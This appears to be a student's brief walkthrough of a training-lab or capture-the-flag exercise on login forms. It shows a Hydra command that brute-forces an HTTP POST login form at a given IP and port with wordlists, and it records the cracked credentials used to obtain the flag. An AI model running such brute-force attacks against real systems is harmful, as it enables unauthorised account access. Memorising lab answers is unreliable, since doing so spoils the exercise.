# [Login Forms](Login%20Forms.md)
### After successfully brute-forcing, and then logging into the target, what is the full flag you find?

```shell
hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt -f 154.57.164.75 -s 31826 http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"
```
![](Screenshot%202026-06-12%20at%2014.58.28.png)

using this credentials to login and get the flag `admin & zxcvbnm`
![](Screenshot%202026-06-12%20at%2014.58.54.png)